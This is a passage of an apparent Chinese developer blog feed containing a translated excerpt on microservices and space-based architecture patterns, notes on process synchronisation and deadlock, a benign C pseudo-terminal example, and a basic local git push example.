RMI等）进行访问。这种架构的分布式特性是它实现一些优越的可扩展性和部署特性的关键所在。</p><p>微服务架构另一个令人兴奋的特性是它是由其他常见架构模式存在的问题演化来的，而不是作为一个解决方案被创造出来等待问题出现。微服务架构的演化有两个主要来源：使用分层架构模式的单体应用和使用面向服务架构的分布式应用。</p><p>由单体应用( 一个应用就是一个整体 )到微服务的发展过程主要是由持续交付开发促成的。从开发到生产的持续部署管道概念,简化了应用程序的部署。单体应用通常是由紧耦合的组件组成，这些组件同时又是另一个单一可部署单元的一部分，这使得它繁琐，难以改变、测试和部署应用（因此常见的“月度部署”周期出现并通常发生在大型IT商店项目）。这些因素通常会导致应用变得脆弱以至于每次有一点新功能部署后应用就不能运行。微服务架构模式通过将应用分隔成多个可部署的单元（服务组件）的方法来解决这一问题，这些服务组件可以独立于其他服务组件进行单独开发、测试和部署。</p><p>另一个导致微服务架构模式产生的演化过程是由面向服务架构模式（SOA）应用程序存在的问题引起的。虽然SOA模式非常强大，提供了无与伦比的抽象级别、异构连接、服务编排，并保证通过IT能力调整业务目标，但它仍然是复杂的,昂贵的,普遍存在，它很难理解和实现，对大多数应用程序来说过犹不及。微服务架构通过简化服务概念，消除编排需求、简化服务组件连接和访问来解决复杂度问题。</p><h3 id="模式拓扑"><a href="#模式拓扑" class="headerlink" title="模式拓扑"></a>模式拓扑</h3><p>虽然有很多方法来实现微服务架构模式,但三个主要的拓扑结构脱颖而出，最常见和流行的有:基于REST API的拓扑结构,基于REST的应用拓扑结构和集中式消息拓扑结构。</p><p>基于REST的API拓扑适用于网站，通过某些API对外提供小型的、自包含的服务。这种拓扑结构,如图4 - 2所示,由粒度非常细的服务组件（因此得名微服务）组成，这些服务组件包含一个或两个模块并独立于其他服务来执行特定业务功能。在这种拓结构扑中,这些细粒度的服务组件通常被REST-based的接口访问，而这个接口是通过一个单独部署的web API层实现的。此种拓扑的例子包含一些常见的专用的、基于云的RESTful web service，大型网站像Yahoo, Google, and Amazon都在使用。</p><p><img src="images/4-2.png" alt="4-2">    </p><p>基于REST的应用拓扑结构与基于REST API的不同，它通过传统的基于web的或胖客户端业务应用来接收客户端请求，而不是通过一个简单的API层。如图4-3所示，应用的用户接口层（user interface layer）是一个web应用，可以通过简单的REST-based接口访问单独部署的服务组件（业务功能）。该拓扑结构中的服务组件与API-REST-based拓扑结构中的不同，这些服务组件往往会更大、粒度更粗、代表整个业务应用程序的一小部分，而不是细粒度的、单一操作的服务。这种拓扑结构常见于中小型企业等复程度相对较低的应用程序。</p><p><img src="images/4-3.png" alt="4-3">    </p><p>微服务架构模式中另一个常见的方法是集中式消息拓扑。该拓扑（如图4-4所示）与前面提到的基于REST的应用拓扑类似，不同的是，application REST- based拓扑结构使用REST进行远程访问，而该拓扑结构则使用一个轻量级的集中式消息代理（如，ActiveMQ, HornetQ等等）。不要将该拓扑与面向服务架构模式混淆或将其当做SOA简化版（“SOA-Lite”），这点是极其重要的。该拓扑中的轻量级消息代理（Lightweight Message Broker）不执行任何编排,转换,或复杂的路由;相反,它只是一个轻量级访问远程服务组件的传输工具。</p><p>集中式消息拓扑结构通常应用在较大的业务应用程序中，或对于某些对传输层到用户接口层或者到服务组件层有较复杂的控制逻辑的应用程序中。该拓扑较之先前讨论的简单基于REST的拓扑结构，其好处是有先进的排队机制、异步消息传递、监控、错误处理和更好的负载均衡和可扩展性。与集中式代理相关的单点故障和架构瓶颈问题已通过代理集群和代理联盟（将一个代理实例为分多个代理实例，把基于系统功能区域的吞吐量负载划分开处理）解决。</p><p><img src="images/4-4.png" alt="4-4">   </p><h3 id="避免依赖和编排"><a href="#避免依赖和编排" class="headerlink" title="避免依赖和编排"></a>避免依赖和编排</h3><p>微服务架构模式的主要挑战之一就是决定服务组件的粒度级别。如果服务组件粒度过粗，那你可能不会意识到这个架构模式带来的好处（部署、可扩展性、可测试性和松耦合），然而,服务组件粒度过细将导致服务编制要求,这会很快导致将微服务架构模式变成一个复杂、容易混淆、代价昂贵并易于出错的重量级面向服务架构。</p><p>如果你发现需要从应用内部的用户接口或API层编排服务组件，那么很有可能你服务组件的粒度太细了。如果你发现你需要在服务组件之间执行服务间通信来处理单个请求,那么很有可能要么是你服务组件的粒度太细了，要么是没有从业务功能角度正确划分服务组件。</p><p>服务间通信，可能导致组件之间产生耦合，但可以通过共享数据库进行处理。例如，若一个服务组件处理网络订单而需要用户信息时，它可以去数据库检索必要的数据，而不是调用客户服务组件的功能。</p><p>共享数据库可以处理信息需求，但是共享功能呢？如果一个服务组件需要的功能包含在另一个服务组件内，或是一个公共的功能,那么有时你可以将服务组件的共享功能复制一份（因此违反了DRY规则：don’t repeat yourself）。为了保持服务组件独立和部署分离，微服务架构模式实现中会存在一小部分由重复的业务逻辑而造成的冗余，这在大多数业务应用程序中是一个相当常见的问题。小工具类可能属于这一类重复的代码。</p><p>如果你发现就算不考虑服务组件粒度的级别，你仍不能避免服务组件编排,这是一个好迹象,可能此架构模式不适用于你的应用。由于这种模式的分布式特性，很难维护服务组件之间的单一工作事务单元。这种做法需要某种事务补偿框架回滚事务,这对此相对简单而优雅的架构模式来说，显著增加了复杂性。</p><h3 id="注意事项-2"><a href="#注意事项-2" class="headerlink" title="注意事项"></a>注意事项</h3><p>微服务架构模式解决了很多单体应用和面向服务架构应用存在的问题。由于主要应用组件被分成更小的,单独部署单元,使用微服务架构模式构建的应用程序通常更健壮,并提供更好的可扩展性,支持持续交付也更容易。</p><p>该模式的另一个优点是,它提供了实时生产部署能力，从而大大减少了传统的月度或周末“大爆炸”生产部署的需求。因为变化通常被隔离成特定的服务组件，只有变化的服务组件才需要部署。如果你的服务组件只有一个实例，你可以在用户界面程序编写专门的代码用于检测一个活跃的热部署,一旦检测到就将用户重定向到一个错误页面或等待页面。你也可以在实时部署期间，将服务组件的多个实例进行交换，允许应用程序在部署期间保持持续可用性（分层架构模式很难做到这点）。</p><p>最后一个要重视的考虑是，由于微服务架构模式是分布式的架构，他与事件驱动架构模式具有一些共同的复杂的问题，包括约定的创建、维护，和管理，远程系统的可用性，远程访问身份验证和授权。</p><h3 id="模式分析-4"><a href="#模式分析-4" class="headerlink" title="模式分析"></a>模式分析</h3><p>下面这个表中包含了微服务架构模式的特点分析和评级，每个特性的评级是基于自然趋势，基于典型模式实现的能力特性,以及该模式是以什么闻名的。本报告中该模式与其他模式的并排比较，请参考报告最后的附件A。</p><h4 id="整体灵活性-3"><a href="#整体灵活性-3" class="headerlink" title="整体灵活性"></a>整体灵活性</h4><p>评级：高<br>分析：整体的灵活性是能够快速响应不断变化的环境。由于单独部署单元的概念,变化通常被隔离成单独的服务组件,使得部署变得快而简单。同时，使用这种模式构建的应用往往是松耦合的，也有助于促进改变。</p><h4 id="易于部署-3"><a href="#易于部署-3" class="headerlink" title="易于部署"></a>易于部署</h4><p>评级：高<br>分析：整体来讲，由于该模式的解耦特性和事件处理组件使得部署变得相对简单。broker拓扑往往比mediator拓扑更易于部署，主要是因为event-mediator组件与事件处理器是紧耦合的，事件处理器组件有一个变化可能导致event mediator跟着变化，有任何变化两者都需要部署。</p><h4 id="可测试性-3"><a href="#可测试性-3" class="headerlink" title="可测试性"></a>可测试性</h4><p>评级：高<br>分析：由于业务功能被分离成独立的应用模块,可以在局部范围内进行测试，这样测试工作就更有针对性。对一个特定的服务组件进行回归测试比对整个单体应用程序进行回归测试更简单、更可行。而且,由于这种模式的服务组件是松散耦合的，从开发角度来看，由一个变化导致应用其他部分也跟着变化的几率很小，并能减小由于一个微小的变化而不得不对整个应用程序进行测试的负担。</p><h4 id="性能-2"><a href="#性能-2" class="headerlink" title="性能"></a>性能</h4><p>评级：低<br>分析：虽然你可以从实现该模式来创建应用程序并可以很好的运行，整体来说，由于微服务架构模式的分布式特性，并不适用于高性能的应用程序。</p><h4 id="伸缩性-3"><a href="#伸缩性-3" class="headerlink" title="伸缩性"></a>伸缩性</h4><p>评级：高<br>分析：由于应用程序被分为单独的部署单元,每个服务组件可以单独扩展，并允许对应用程序进行扩展调整。例如，股票交易的管理员功能区域可能不需要扩展，因为使用该功能的用户很少，但是交易布局服务组件可能需要扩展，因为大多数交易应用程序需要具备处理高吞吐量的功能。</p><h4 id="易于开发-2"><a href="#易于开发-2" class="headerlink" title="易于开发"></a>易于开发</h4><p>评级：高<br>分析：由于功能被分隔成不同的服务组件，由于开发范围更小且被隔离，开发变得更简单。程序员在一个服务组件做出一个变化影响其他服务组件的几率是很小的，从而减少开发人员或开发团队之间的协调。</p><p><b id="chapter5"></b></p><h2 id="第五章-基于空间的架构"><a href="#第五章-基于空间的架构" class="headerlink" title="第五章 基于空间的架构"></a>第五章 基于空间的架构</h2><p>大多数基于网站的商务应用都遵循相同的请求流程：一个请求从浏览器发到web服务器，然后到应用服务器，然后到数据库服务器。虽然这个模式在用户数不大的时候工作良好，但随着用户负载的增加,瓶颈会开始出现，首先出现在web服务器层，然后应用服务器层，最后数据库服务器层。通常的解决办法就是<strong>向外扩展</strong>，也就是增加服务器数量。这个方法相对来说简单和廉价，并能够解决问题。然而，对于大多数高访问量的情况，它只不过是把web服务器的问题移到了应用服务器。而扩展应用服务器会更复杂，而且成本更高，并且又只是把问题移动到了数据库服务器，那会更复杂，更贵。就算你能扩展数据库服务器，你最终会陷入一个金字塔式的情形，在金字塔最下面是web服务器，它会出现最多的问题，但也最好伸缩。金字塔顶部是数据库服务器，问题不多，但最难伸缩。</p><p>在一个高并发大容量的应用中，数据库通常是决定应用能够支持多少用户同时在线的关键因素。虽然各种缓存技术和数据库伸缩产品都在帮助解决这个问题，但数据库难以伸缩的现实并没有改变。</p><p>基于空间的架构模型是专门为了<strong>解决伸缩性和并发问题</strong>而设计的。它对于用户数量不可预测且数量级经常变化的情况同样适用。在架构级别来解决这个伸缩性问题通常是比增加服务器数量或者提高缓存技术更好的解决办法。</p><h3 id="模型介绍"><a href="#模型介绍" class="headerlink" title="模型介绍"></a>模型介绍</h3><p>基于空间的模型（有时也称为云架构模型）旨在减少限制应用伸缩的因素。模型的名字来源于分布式共享内存中的 tuple space（数组空间）概念。高伸缩性是通过去除中心数据库的限制，并使用从内存中复制的数据框架来获得的。保存在内存的应用数据被复制给所有运行的进程。进程可以动态的随着用户数量增减而启动或结束，以此来解决伸缩性问题。这样因为没有了中心数据库，数据库瓶颈就此解决，此后可以近乎无限制的扩展了。</p><p>大多数使用这个模型的应用都是标准的网站，它们接受来自浏览器的请求并进行相关操作。竞价拍卖网站是一个很好的例子 ( 12306更是一个典型的示例 )。网站不停的接受来自浏览器的报价。应用收到对某一商品的报价，记录下报价和时间，并且更新对该商品的报价，将信息返回给浏览器。</p><p>这个架构中有两个主要的模块：<strong>处理单元</strong> 和 <strong>虚拟化中间件</strong>。下图展示了这个架构和里面的主要模块。</p><p><img src="images/5-1.png" alt=""></p><p>处理单元包含了应用模块（或者部分的应用模块）。具体来说就是包含了web组件以及后台业务逻辑。处理单元的内容根据应用的类型而异——小型的web应用可能会部署到单一的处理单元，而大型一些的应用会将应用的不同功能模块部署到不同的处理单元中。典型的处理单元包括应用模块，以及保存在内存的数据框架和为应用失败时准备的异步数据持久化模块。它还包括复制引擎，使得虚拟化中间件可以将处理单元修改的数据复制到其他活动的处理单元。</p><p>虚拟化中间件负责保护自身以及通信。它包含用于数据同步和处理请求的模块，以及通信框架，数据框架，处理框架和部署管理器。这些在下文中即将介绍的部分，可以自定义编写或者购买第三方产品来实现。</p><h3 id="组件间合作"><a href="#组件间合作" class="headerlink" title="组件间合作"></a>组件间合作</h3><p>基于空间的架构的魔力就在虚拟化中间件，以及各个处理单元中的内存中数据框架。下图展示了包含着应用模块、内存中数据框架、处理异步数据恢复的组件和复制引擎的处理单元架构。</p><p>虚拟化中间件本质上是架构的控制器，它管理请求，会话，数据复制，分布式的请求处理和处理单元的部署。虚拟化中间件有四个架构组件：通信框架，数据框架，处理框架和部署管理器。</p><p><img src="images/5-2.png" alt=""></p><h4 id="通信框架"><a href="#通信框架" class="headerlink" title="通信框架"></a>通信框架</h4><p>通信框架管理输入请求和会话信息。当有请求进入虚拟化中间件，通信框架就决定有哪个处理单元可用，并将请求传递给这个处理单元。通信框架的复杂程度可以从简单的round robin算法到更复杂的用于监控哪个请求正在被哪个处理单元处理的next-available算法。</p><p><img src="images/5-3.png" alt=""></p><h4 id="数据框架"><a href="#数据框架" class="headerlink" title="数据框架"></a>数据框架</h4><p>数据框架可能是这个架构中最重要和关键的组件。它与各个处理单元的数据复制引擎交互，在数据更新时来管理数据复制功能。由于通信框架可以将请求传递给任何可用的处理单元，所以每个处理单元包含完全一样的内存中数据就很关键。下图展示处理单元间如何同步数据复制，实际中是通过非常迅速的并行的异步复制来完成的，通常在微秒级。</p><p><img src="images/5-4.png" alt=""></p><h4 id="处理框架"><a href="#处理框架" class="headerlink" title="处理框架"></a>处理框架</h4><p>处理框架，就像下图所示，是虚拟化中间件中一个可选组件，负责管理在有多个处理单元时的分布式请求处理，每个处理单元可能只负责应用中的某个特定功能。如果请求需要处理单元间合作（比如，一个订单处理单元和顾客处理单元），此时处理框架就充当处理单元见数据传递的媒介。</p><p><img src="images/5-5.png" alt=""></p><h4 id="部署管理器"><a href="#部署管理器" class="headerlink" title="部署管理器"></a>部署管理器</h4><p>部署管理器根据负载情况管理处理单元的动态启动和关闭。它持续检测请求所需时间和在线用户量，在负载增加时启动新的处理单元，在负载下降时关闭处理单元。它是实现可变伸缩性需求的关键。</p><h3 id="其他考虑"><a href="#其他考虑" class="headerlink" title="其他考虑"></a>其他考虑</h3><p>基于空间的架构是一个复杂和实现起来相对昂贵的框架。对于有可变伸缩性需求的小型web应用是很好的选择，然而，对于拥有大量数据操作的传统大规模关系型数据库应用，并不那么适用。</p><p>虽然基于空间的架构模型不需要集中式的数据储存，但通常还是需要这样一个，来进行初始化内存中数据框架，和异步的更新各处理单元的数据。通常也会创建一个单独的分区，来从隔离常用的断电就消失的数据和不常用的数据，这样减少处理单元之间对对方内存数据的依赖。</p><p>值得注意的是，虽然这个架构的另一个名字是云架构，处理单元（以及虚拟化中间件）都没有放在云端服务或者PaaS上。他们同样可以简单的放在本地服务器，这也是为什么我更倾向叫它“基于空间的架构”。</p><p>从产品实现的角度讲，这个架构中的很多组件都可以从第三方获得，比如GemFire, JavaSpaces, GigaSpaces，IBM Object Grid，nCache，和 Oracle Coherence。由于架构的实现根据工程的预算和需求而异，所以作为架构师，你应该在实现或选购第三方产品前首先明确你的目标和需求。</p><h3 id="架构分析"><a href="#架构分析" class="headerlink" title="架构分析"></a>架构分析</h3><p>下面的表格是这个架构的特征分析和评分。每个特征的评分是基于一个典型的架构实现来给出的。要知道这个模式相对别的模式的对比，请参见最后的附录A。</p><h4 id="综合能力"><a href="#综合能力" class="headerlink" title="综合能力"></a>综合能力</h4><p>评分：高<br>分析：综合能力是对环境变化做出快速反应的能力。因为处理单元（应用的部署实例）可以快速的启动和关闭，整个应用可以根据用户量和负载做出反应。使用这个架构通常在应对代码变化上，由于较小的应用规模和组件间相互依赖，也会反映良好。</p><h4 id="易于部署-4"><a href="#易于部署-4" class="headerlink" title="易于部署"></a>易于部署</h4><p>评分：高<br>分析：虽然基于空间的架构通常没有解耦合并且功能分布，但他们是动态的，也是成熟的基于云的工具，允许应用轻松的部署到服务器。</p><h4 id="可测试性-4"><a href="#可测试性-4" class="headerlink" title="可测试性"></a>可测试性</h4><p>评分：低<br>分析：测试高用户负载既昂贵又耗时，所以在测试架构的可伸缩性方面很困难</p><h4 id="性能-3"><a href="#性能-3" class="headerlink" title="性能"></a>性能</h4><p>评分：高<br>分析：通过内存中数据存取和架构中的缓存机制可获得高性能</p><h4 id="伸缩性-4"><a href="#伸缩性-4" class="headerlink" title="伸缩性"></a>伸缩性</h4><p>评分：高<br>分析：高伸缩性是源于几乎不依赖集中式的数据库，从而去除了这个限制伸缩性的瓶颈。</p><h4 id="易于开发-3"><a href="#易于开发-3" class="headerlink" title="易于开发"></a>易于开发</h4><p>评分：低<br>分析：主要是因为难以熟悉这个架构开发所需得工具和第三方产品，因此使用该架构需要较大的学习成本。而且，开发过程中还需要特别注意不要影响到性能和可伸缩性。</p><p><b id="appendix"></b></p><h3 id="附录A"><a href="#附录A" class="headerlink" title="附录A"></a>附录A</h3><h4 id="模式分析总结"><a href="#模式分析总结" class="headerlink" title="模式分析总结"></a>模式分析总结</h4><p>图A-1 总结了在这个报告中，对于架构模式的每部分进行的模式分析所产生的影响。这个总结帮助你确定哪些模式可能是最适合你的情况。例如,如果你的架构模式重点是可伸缩性，你可以在这个图表看看事件驱动模式,microservices模式,和基于空间模式，这些对于你来说可能是很好的架构模式的选择。同样的,如果你的程序注重的是分层架构模式,你可以参考图看到部署、性能和可伸缩性的在你的架构中所存在的风险。</p><p><img src="images/a-1.png" alt="a-1">     </p><p>同时这个图表将指导你选择正确的模式,因为在选择一种架构模式的时候，有更多的因素需要考虑。你必须分析你的环境的各个方面,包括基础设施的支持,开发人员技能,项目预算,项目最后期限,和应用程序大小等等。选择正确的架构模式是至关重要的,因为一旦一个架构被确定就很难改变。</p><p><b id="author"></b></p><h3 id="关于作者"><a href="#关于作者" class="headerlink" title="关于作者"></a>关于作者</h3><p>Mark•Richards是一位有丰富经验的软件架构师，他参与架构、设计和实施microservices体系结构、面向服务的体系结构和在J2EE中的分布式系统和其他技术。自1983年以来，他一直从事软件行业,在应用、继承和企业架构方面有大量的经验和专业知识。</p><p>Mark在1999到2003年间担任新英格兰Java用户组的主席。他是许多技术书籍和视频的作者,包括软件架构基础(O‘Reilly视频)、企业消息传递(O’Reilly视频),《Java消息服务，第二版》(O’Reilly)和《软件架构师应该知道的97件事》(O’Reilly)的特约作者。Mark拥有一个计算机科学硕士学位并且多次获得IBM、Sun、开放集团和BEA等颁发的架构师和开发人员认证。 </p><p>他是Fluff Just Stuff(NFJS)研讨会系列（一个不定期会议）议长,并且有过上百次的在世界各地公益会议和用户组上围绕技术主题的演讲经验)。Mark不工作的时候经常会到白色山脉或阿帕拉契山径徒步旅行。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;img src=&quot;images/cover.png&quot; alt=&quot;cover&quot;&gt;&lt;/p&gt;
&lt;p&gt;软件架构模式  Mark Richards 著&lt;br&gt;版权归 © 2015 O’Reilly Media, Inc. 所有.      &lt;/p&gt;
&lt;p&gt;原书发布链接为&lt;a href=&quot;http://www.oreilly.com/programming/free/software-architecture-patterns.csp&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;Software Architecture Patterns&lt;/a&gt;.&lt;/p&gt;
    
    </summary>
    
      <category term="DEVELOP" scheme="http://demonelf.github.io/categories/DEVELOP/"/>
    
    
  </entry>
  
  <entry>
    <title>编写多进程、线程同步问题总结</title>
    <link href="http://demonelf.github.io/DEVELOP/%E7%BC%96%E5%86%99%E5%A4%9A%E8%BF%9B%E7%A8%8B%E3%80%81%E7%BA%BF%E7%A8%8B%E5%90%8C%E6%AD%A5%E9%97%AE%E9%A2%98%E6%80%BB%E7%BB%93.html"/>
    <id>http://demonelf.github.io/DEVELOP/编写多进程、线程同步问题总结.html</id>
    <published>2019-08-29T05:14:34.947Z</published>
    <updated>2019-08-29T05:12:29.572Z</updated>
    
    <content type="html"><![CDATA[<p>注: 多进程时所主要解决的就是进程同步问题。</p><ol><li>进程同步:<br>进程同步的主要任务是对多个相关进程在执行次序上进行协调，以使并发执行的诸进程之间能有效地共享资源和相互合作，从而使程序的执行具有可再现性。</li></ol><h1 id="1-1-进程同步存在的问题"><a href="#1-1-进程同步存在的问题" class="headerlink" title="1.1 进程同步存在的问题:"></a>1.1 进程同步存在的问题:</h1><p>一、两种形式的制约关系</p><ol><li>间接相互制约关系(<strong>存在临界资源需要互斥</strong>)</li><li>直接相互制约关系(<strong>进程存在前后执行顺序</strong>)</li></ol><p>二、产生死锁</p><p>1.产生死锁的原因</p><pre><code>(1) 竞争资源  (2) 进程间推进顺序非法</code></pre><p>2.产生死锁的必要条件</p><pre><code>(1)    互斥条件            (不可预防)(2)    请求和保持条件        (可预防)(3)    不剥夺条件           (可预防)(4)    环路等待条件         (可预防)</code></pre><p>3.死锁的类型<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">(1)嵌套型 (即便一个临界资源 也会发生死锁)</div><div class="line">(2)AB-BA </div><div class="line">(3)有待完善！</div></pre></td></tr></table></figure></p><h1 id="1-2-解决的方法"><a href="#1-2-解决的方法" class="headerlink" title="1.2 解决的方法:"></a>1.2 解决的方法:</h1><p>一、数据结构:    </p><ol><li><p>信号量:<br>(实现互斥 例: APUE中的14.3 记录锁 15.8 XSI IPC的信号量)</p><pre><code>(1) 整型信号量  (2) 记录型信号量  (3) AND 型信号量  (4) 信号量集 </code></pre></li></ol><p>二、算法    :</p><pre><code>1 实现同步:    (1) 生产者—消费者问题    (2) 哲学家进餐问题    (3) 读者—写者问题2 解决死锁:    (1) 预防死锁: 破坏产生死锁的必要条件    (2) 避免死锁: 利用算法防止进入不安全状态(银行家算法)    (3) 检测死锁: 产生死锁后采取适当措施    (4) 解除死锁: 产生死锁后撤销挂起某些进程</code></pre>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;注: 多进程时所主要解决的就是进程同步问题。&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;进程同步:&lt;br&gt;进程同步的主要任务是对多个相关进程在执行次序上进行协调，以使并发执行的诸进程之间能有效地共享资源和相互合作，从而使程序的执行具有可再现性。&lt;/li&gt;
&lt;/ol&gt;
&lt;h1 id=&quot;1-1-进程同步存在的问题&quot;&gt;&lt;a href=&quot;#1-1-进程同步存在的问题&quot; class=&quot;headerlink&quot; title=&quot;1.1 进程同步存在的问题:&quot;&gt;&lt;/a&gt;1.1 进程同步存在的问题:&lt;/h1&gt;
    
    </summary>
    
      <category term="DEVELOP" scheme="http://demonelf.github.io/categories/DEVELOP/"/>
    
    
  </entry>
  
  <entry>
    <title>pty示例代码</title>
    <link href="http://demonelf.github.io/DEVELOP/pty%E7%A4%BA%E4%BE%8B%E4%BB%A3%E7%A0%81.html"/>
    <id>http://demonelf.github.io/DEVELOP/pty示例代码.html</id>
    <published>2019-08-29T05:14:34.944Z</published>
    <updated>2019-08-29T05:12:16.553Z</updated>
    
    <content type="html"><![CDATA[<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">define</span> _XOPEN_SOURCE</span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;pty.h&gt;</span></span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">        <span class="keyword">int</span> fd_m, fd_s;</div><div class="line">        <span class="keyword">int</span> len;</div><div class="line">        <span class="keyword">const</span> <span class="keyword">char</span> *pts_name;</div><div class="line">        <span class="keyword">char</span> send_buf[<span class="number">64</span>] = <span class="string">"abc\ndefghijk\nlmn"</span>;</div><div class="line">        <span class="keyword">char</span> recv_buf[<span class="number">64</span>] = &#123;<span class="number">0</span>&#125;;</div><div class="line"></div><div class="line">        fd_m = open(<span class="string">"/dev/ptmx"</span>, O_RDWR | O_NOCTTY);</div><div class="line">        <span class="keyword">if</span> (fd_m &lt; <span class="number">0</span>) &#123;</div><div class="line">                <span class="built_in">printf</span>(<span class="string">"open /dev/ptmx fail1\n"</span>);</div><div class="line">                <span class="keyword">return</span> <span class="number">-1</span>;</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        <span class="keyword">if</span> (grantpt(fd_m) &lt; <span class="number">0</span> || unlockpt(fd_m) &lt; <span class="number">0</span>) &#123;</div><div class="line">                <span class="built_in">printf</span>(<span class="string">"grantpt and unlockpt fail\n"</span>);</div><div class="line">                <span class="keyword">goto</span> err;</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        pts_name = (<span class="keyword">const</span> <span class="keyword">char</span> *)ptsname(fd_m);</div><div class="line">        fd_s = open(pts_name, O_RDONLY | O_NOCTTY);</div><div class="line">        <span class="keyword">if</span> (fd_s &lt; <span class="number">0</span>) &#123;</div><div class="line">                <span class="built_in">printf</span>(<span class="string">"open /dev/ptmx fail2\n"</span>);</div><div class="line">                <span class="keyword">goto</span> err;</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        len = write(fd_m, send_buf, <span class="built_in">strlen</span>(send_buf));</div><div class="line">        <span class="built_in">printf</span>(<span class="string">"write len=%d\n"</span>, len);</div><div class="line"></div><div class="line">        len = read(fd_s, recv_buf, <span class="keyword">sizeof</span>(recv_buf));</div><div class="line">        <span class="built_in">printf</span>(<span class="string">"read len=%d, recv_buf=[%s]\n"</span>, len, recv_buf);</div><div class="line"></div><div class="line">        len = read(fd_s, recv_buf, <span class="keyword">sizeof</span>(recv_buf));</div><div class="line">        <span class="built_in">printf</span>(<span class="string">"read len=%d, recv_buf=[%s]\n"</span>, len, recv_buf);</div><div class="line"></div><div class="line">        close(fd_m);</div><div class="line">        close(fd_s);</div><div class="line">        <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line"></div><div class="line">err:</div><div class="line">        <span class="keyword">if</span> (fd_m)</div><div class="line">                close(fd_m);</div><div class="line">        <span class="keyword">if</span> (fd_s)</div><div class="line">                close(fd_s);</div><div class="line"></div><div class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;figure class=&quot;highlight c&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;d
      
    
    </summary>
    
      <category term="DEVELOP" scheme="http://demonelf.github.io/categories/DEVELOP/"/>
    
    
  </entry>
  
  <entry>
    <title>Git常用命令图表</title>
    <link href="http://demonelf.github.io/DEVELOP/Git%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E5%9B%BE%E8%A1%A8.html"/>
    <id>http://demonelf.github.io/DEVELOP/Git常用命令图表.html</id>
    <published>2019-08-29T05:14:34.942Z</published>
    <updated>2019-08-29T05:12:10.201Z</updated>
    
    <content type="html"><![CDATA[<p>有这几个git命令就够用了</p><p><img src="Git常用命令图表.png" alt=""></p><p>示例: 保存本地/home/example_a目录到本地/home/example_b目录</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">cd /home/example_b</div><div class="line">git init --bare</div><div class="line">cd /home/example_a</div><div class="line">git init</div><div class="line">git remote add test_remote /home/example_b</div><div class="line">git add -A</div><div class="line">git commit -m "1.git初始化"</div><div class="line">git push -u test_remote master</div></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;有这几个git命令就够用了&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;Git常用命令图表.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;示例: 保存本地/home/example_a目录到本地/home/example_b目录&lt;/p&gt;
    
    </summary>
    
      <category term="DEVELOP" scheme="http://demonelf.github.io/categories/DEVELOP/"/>
    
    
  </entry>
  
  <entry>
    <title>使用SSH反向隧道进行内网穿透</title>
    <link href="http://demonelf.github.io/SYSTEM/%E4%BD%BF%E7%94%A8SSH%E5%8F%8D%E5%90%91%E9%9A%A7%E9%81%93%E8%BF%9B%E8%A1%8C%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F.html"/>
    <id>http://demonelf.github.io/SYSTEM/使用SSH反向隧道进行内网穿透.html</id>
